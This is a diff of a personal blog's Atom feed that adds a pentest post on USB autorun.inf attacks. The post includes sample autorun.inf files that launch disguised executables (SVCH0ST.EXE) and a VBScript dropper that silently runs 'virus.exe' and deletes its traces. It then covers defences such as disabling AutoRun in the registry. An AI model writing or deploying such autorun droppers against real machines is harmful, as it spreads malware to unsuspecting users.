@@ -1,5 +1,199 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://theodorecooper.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theodorecooper.github.io/" rel="alternate" type="text/html" hreflang="en-us" /><updated>2022-02-09T11:07:41+08:00</updated><id>https://theodorecooper.github.io/feed.xml</id><title type="html">Theodore Cooper</title><subtitle>It's a freak geek's silly site. Theodore Cooper.
-</subtitle><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><entry><title type="html">All the best for 2022!</title><link href="https://theodorecooper.github.io/other/2022-n22/" rel="alternate" type="text/html" title="All the best for 2022!" /><published>2022-01-01T00:00:00+08:00</published><updated>2022-01-01T17:07:57+08:00</updated><id>https://theodorecooper.github.io/other/n22</id><content type="html" xml:base="https://theodorecooper.github.io/other/2022-n22/"></content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Other" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)</title><link href="https://theodorecooper.github.io/linux/pentest/2021-mdk3/" rel="alternate" type="text/html" title="Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)" /><published>2021-11-20T00:00:00+08:00</published><updated>2021-11-20T21:31:35+08:00</updated><id>https://theodorecooper.github.io/linux/pentest/mdk3</id><content type="html" xml:base="https://theodorecooper.github.io/linux/pentest/2021-mdk3/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://theodorecooper.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://theodorecooper.github.io/" rel="alternate" type="text/html" hreflang="en-us" /><updated>2022-03-26T18:33:33+08:00</updated><id>https://theodorecooper.github.io/feed.xml</id><title type="html">Theodore Cooper</title><subtitle>It's a freak geek's silly site. Theodore Cooper.
+</subtitle><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><entry><title type="html">Advanced way to hack with AutoRun.inf | Virus carried by USB sticks</title><link href="https://theodorecooper.github.io/pentest/2022-autorun/" rel="alternate" type="text/html" title="Advanced way to hack with AutoRun.inf | Virus carried by USB sticks" /><published>2022-03-20T00:00:00+08:00</published><updated>2022-03-26T18:33:33+08:00</updated><id>https://theodorecooper.github.io/pentest/autorun</id><content type="html" xml:base="https://theodorecooper.github.io/pentest/2022-autorun/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;You may be wondering what exactly is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt; is a text file that can be used by the &lt;em&gt;AutoRun&lt;/em&gt; and &lt;em&gt;AutoPlay&lt;/em&gt; components of Microsoft Windows operating systems. It contains the code that will be execute automatically. It is often existed in the root directory of USB sticks and DVD.&lt;/p&gt;
+
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
+      &lt;th&gt;&lt;strong&gt;Autorun.inf&lt;/strong&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Type&lt;/td&gt;
+      &lt;td&gt;&lt;em&gt;Virus/Worm&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Danger Level&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;High&lt;/strong&gt; (Will lock you out of your drives and potentially steal private information)&lt;br /&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Symptoms&lt;/td&gt;
+      &lt;td&gt;When you try to access one of your drives you will be blocked by a looped Autorun menu.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Distribution Method&lt;/td&gt;
+      &lt;td&gt;Can install itself online from one infected drive onto another, can also be contracted from installing an infected executable file obtained from malicious email or other download.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;write-a-autoruninf&quot;&gt;Write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;Insert a USB stick. As I mentioned before, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt; should be placed in the root directory of the volume, so we create in the root directory and open the file with any text editor.&lt;/p&gt;
+
+&lt;p&gt;The Autorun.inf file can also contain optional information including:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The name of a file that contains an icon that will represent your
+application’s CD-ROM drive. This icon will be displayed by Windows
+Explorer in place of the standard drive icon.&lt;/li&gt;
+  &lt;li&gt;Additional commands for the shortcut menu that is displayed when the
+user right-clicks the CD-ROM icon. You can also specify the default
+command that is run when the user double-clicks the icon.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The &lt;strong&gt;[autorun]&lt;/strong&gt; section contains the default AutoRun commands. All Autorun.inf files must have an &lt;strong&gt;[autorun]&lt;/strong&gt; section.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;defaulticon&lt;/td&gt;
+      &lt;td&gt;Specifies the default icon for the application.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;icon&lt;/td&gt;
+      &lt;td&gt;Specifies the path and file name of an application-specific icon for the CD-ROM drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;open&lt;/td&gt;
+      &lt;td&gt;Specifies the path and file name of the startup application.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;useautorun&lt;/td&gt;
+      &lt;td&gt;Specifies that Autoplay V2 features should be used if supported.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;shell&lt;/td&gt;
+      &lt;td&gt;Defines the default command in the CD-ROM’s shortcut menu.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;shell_verb&lt;/td&gt;
+      &lt;td&gt;Adds commands to the CD-ROM’s shortcut menu.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Here are two common examples:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
+open=.\RECYCLER\RECYCLER\autorun.exe
+
+shell\1=Open
+shell\1\Command=.\RECYCLER\RECYCLER\autorun.exe
+shell\2\=Browser
+shell\2\Command=.\RECYCLER\RECYCLER\autorun.exe
+
+shellexecute=.\RECYCLER\RECYCLER\autorun.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It will execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RECYCLER\RECYCLER\autorun.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
+open=SVCH0ST.EXE
+shell\open=Open(&amp;amp;O)
+shell\open\Command=SVCH0ST.EXE
+shell\open\Default=1
+shell\explore=Explorer(&amp;amp;X)
+shell\explore\Command=SVCH0ST.EXE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It will execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SVCH0ST.EXE&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;create-an-advanced-autoruninf&quot;&gt;Create an advanced &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;First, we create a &lt;em&gt;Self-exacting File&lt;/em&gt;(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run.exe&lt;/code&gt;), it should contained the virus(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virus.exe&lt;/code&gt;) and a VBS script(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoRun.vbs&lt;/code&gt;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbs&quot;&gt;set sh = wscript.createobject(&quot;wscript.shell&quot;)
+sh.run &quot;cmd /c start virus.exe&quot;,0
+sh.run &quot;cmd /c del Autorun.inf&quot;,0
+sh.run &quot;cmd /c start c:\&quot;,0
+sh.run &quot;cmd /c del AutoRun.vbs&quot;,0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then, upload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run.exe&lt;/code&gt; and Autorun.inf to the target(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt;).&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-prevent-autoruninf-virus&quot;&gt;How to prevent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; virus&lt;/h2&gt;
+
+&lt;p&gt;There are three method to prevent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; virus:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Turn off AutoRun service.&lt;/li&gt;
+  &lt;li&gt;Delete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;turn-off-autorun-service&quot;&gt;Turn off AutoRun service&lt;/h3&gt;
+
+&lt;p&gt;Open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;regedit.exe&lt;/code&gt;, locate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Exploer]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NoDriveTypeAutoRun&lt;/code&gt; decides whether AutoRun is on.&lt;/p&gt;
+
+&lt;p&gt;The following table gives the bits and bitmask constants, that can be set in the first byte of NoDriveTypeAutoRun to disable.&lt;/p&gt;
+
+&lt;p&gt;AutoRun for a particular drive type. You must restart Windows Explorer before the changes take effect.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Bit Number&lt;/th&gt;
+      &lt;th&gt;Bitmask Constant&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x04&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_REMOVEABLE&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Disk can be removed from drive (such as a floppy disk).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x08&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_FIXED&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Disk cannot be removed from drive (a hard disk).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x10&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_REMOTE&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Network drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x20&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_CDROM&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;CD-ROM drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x40&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_RAMDISK&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;RAM disk.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;delete-autoruninf&quot;&gt;Delete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;Open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;, run following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;attrib Autorun.inf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+
+del Autorun.inf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;disable-the-generation-of-autoruninf&quot;&gt;Disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;It’s easy to disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;, just create an empty &lt;strong&gt;folder&lt;/strong&gt; named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; in the root directory.&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Pentest" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/autorun/virus-autorun-cover.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/autorun/virus-autorun-cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">All the best for 2022!</title><link href="https://theodorecooper.github.io/other/2022-n22/" rel="alternate" type="text/html" title="All the best for 2022!" /><published>2022-01-01T00:00:00+08:00</published><updated>2022-01-01T17:07:57+08:00</updated><id>https://theodorecooper.github.io/other/n22</id><content type="html" xml:base="https://theodorecooper.github.io/other/2022-n22/"></content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Other" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)</title><link href="https://theodorecooper.github.io/linux/pentest/2021-mdk3/" rel="alternate" type="text/html" title="Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)" /><published>2021-11-20T00:00:00+08:00</published><updated>2021-11-20T21:31:35+08:00</updated><id>https://theodorecooper.github.io/linux/pentest/mdk3</id><content type="html" xml:base="https://theodorecooper.github.io/linux/pentest/2021-mdk3/">&lt;hr /&gt;
 
 &lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
 
@@ -1905,32 +2099,4 @@ pkill run.sh
 &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;own_window_type dock
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;​	Or you will prefer to hidden desktop icons, the conky won’t disappear either(but of course you can’t see desktop icons).&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Beautify" /><category term="Linux" /><category term="Beautify" /><summary type="html"></summary></entry><entry><title type="html">Delete single file &amp;amp; folder from a Github repository</title><link href="https://theodorecooper.github.io/github/2021-githubrm/" rel="alternate" type="text/html" title="Delete single file &amp;amp; folder from a Github repository" /><published>2021-01-02T00:00:00+08:00</published><updated>2021-06-18T19:43:02+08:00</updated><id>https://theodorecooper.github.io/github/githubrm</id><content type="html" xml:base="https://theodorecooper.github.io/github/2021-githubrm/">&lt;hr /&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Sometimes we need to delete single file or folder in a git respository.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;​	First of all, we use Git Bash in Windows (or Terminal in Linux, OSX).&lt;/p&gt;
-
-&lt;h2 id=&quot;clone-repository&quot;&gt;Clone Repository&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://xxxx/xxx/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;remove-local-file--folder&quot;&gt;Remove local file &amp;amp; folder&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;xxx/
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;file.file	&lt;span class=&quot;c&quot;&gt;#remove single file&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; folder/	&lt;span class=&quot;c&quot;&gt;#remove folder&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;commit&quot;&gt;Commit&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;remove some files&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;push&quot;&gt;Push&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin xxxx	&lt;span class=&quot;c&quot;&gt;#xxxx is your branch&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Github" /><category term="Github" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/githubrm/github.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/githubrm/github.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+&lt;p&gt;​	Or you will prefer to hidden desktop icons, the conky won’t disappear either(but of course you can’t see desktop icons).&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Beautify" /><category term="Linux" /><category term="Beautify" /><summary type="html"></summary></entry></feed>
